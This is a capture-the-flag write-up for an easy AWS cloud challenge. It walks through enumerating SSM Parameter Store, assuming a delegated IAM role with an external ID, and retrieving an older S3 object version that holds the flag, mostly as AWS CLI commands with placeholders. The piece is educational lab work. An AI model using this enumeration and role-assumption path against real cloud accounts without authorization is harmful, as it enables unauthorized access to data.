**Author:** Mohammed Ali  
**Difficulty:** easy
**Category:** cloud 



The challenge provides temporary AWS credentials for an IAM user with limited access. The objective is to inspect AWS Systems Manager Parameter Store, identify the active ferry crossing record, assume a delegated IAM role, and retrieve the correct historical manifest from an S3 bucket.  
  
All instance-specific values such as endpoints, credentials, account IDs, role names, bucket names, object keys, and version IDs should be treated as sensitive and replaced with placeholders when sharing.  
  
**1. Configure AWS CLI**  
  
Set the challenge AWS endpoint, region, and the provided temporary credentials:  
  
`export AWS_ENDPOINT_URL="http://<CHALLENGE_AWS_ENDPOINT>"   export AWS_DEFAULT_REGION="us-east-1"   export AWS_ACCESS_KEY_ID="<INITIAL_ACCESS_KEY>"   export AWS_SECRET_ACCESS_KEY="<INITIAL_SECRET_KEY>"   unset AWS_SESSION_TOKEN`  
  
Confirm that the credentials work:  
  
`aws sts get-caller-identity \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
This should return the IAM identity associated with the ferry clerk account.  
  
**2. Enumerate Systems Manager Parameters**  
  
The challenge hint says to catalog the namespace before reading parameter values.  
  
List the available SSM parameters:  
  
`aws ssm describe-parameters \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
Look for parameters under:  
  
`/ferry/crossing/`  
  
One of the parameters acts as a pointer to the currently active crossing record:  
  
`/ferry/crossing/live-crossing-id`  
**3. Read the Active Crossing ID**  
  
Retrieve the pointer value:  
  
`aws ssm get-parameter \   --name "/ferry/crossing/live-crossing-id" \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
The returned value identifies the active crossing record, for example:  
  
`CROSSING-<ID>`  
**4. Read the Crossing Metadata**  
  
Use the crossing ID to retrieve its metadata:  
  
`aws ssm get-parameter \   --name "/ferry/crossing/CROSSING-<ID>" \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
The parameter value contains JSON metadata with several important fields:  
  
`{   "scanner_role_arn": "<ROLE_ARN>",   "scanner_external_id": "<EXTERNAL_ID>",   "manifest_bucket": "<S3_BUCKET>",   "manifest_object_key": "<OBJECT_KEY>",   "manifest_version_id": "<VERSION_ID>"   }`  
  
These values indicate that the current IAM user must assume another role before accessing the manifest.  
  
**5. Assume the Scanner Role**  
  
Use AWS STS with the supplied role ARN and external ID:  
  
`aws sts assume-role \   --role-arn "<ROLE_ARN>" \   --role-session-name "scanner" \   --external-id "<EXTERNAL_ID>" \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
The command returns temporary credentials:  
  
`AccessKeyId   SecretAccessKey   SessionToken`  
  
Export them:  
  
`export AWS_ACCESS_KEY_ID="<TEMP_ACCESS_KEY>"   export AWS_SECRET_ACCESS_KEY="<TEMP_SECRET_KEY>"   export AWS_SESSION_TOKEN="<TEMP_SESSION_TOKEN>"`  
**6. Retrieve the Versioned S3 Manifest**  
  
Download the exact object version referenced in the SSM metadata:  
  
`aws s3api get-object \   --bucket "<S3_BUCKET>" \   --key "<OBJECT_KEY>" \   --version-id "<VERSION_ID>" \   manifest.txt \   --endpoint-url "$AWS_ENDPOINT_URL"`  
  
Using the supplied version ID is important because the challenge asks for the earlier crossing list rather than only the latest version of the file.  
  
**7. Read the Flag**  
  
Display the downloaded manifest:  
  
`cat manifest.txt`  
  
The file contains the crossing release record and the challenge flag:  
  
`HTB{REDACTED}`  
**Attack Path Summary**  
`Initial IAM credentials   |   v   Enumerate SSM Parameter Store   |   v   Read active crossing ID   |   v   Read crossing metadata   |   v   Obtain role ARN, external ID, S3 location, and version ID   |   v   Assume delegated IAM role   |   v   Use temporary credentials   |   v   Retrieve the specified S3 object version   |   v   Read the flag`  
**Key Takeaways**  
Enumerating cloud resources can reveal indirect references to sensitive data.  
SSM Parameter Store may contain role delegation and storage metadata.  
sts assume-role can provide temporary credentials with additional permissions.  
An external ID may be required by a role trust policy.  
S3 version IDs can expose earlier versions


### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon

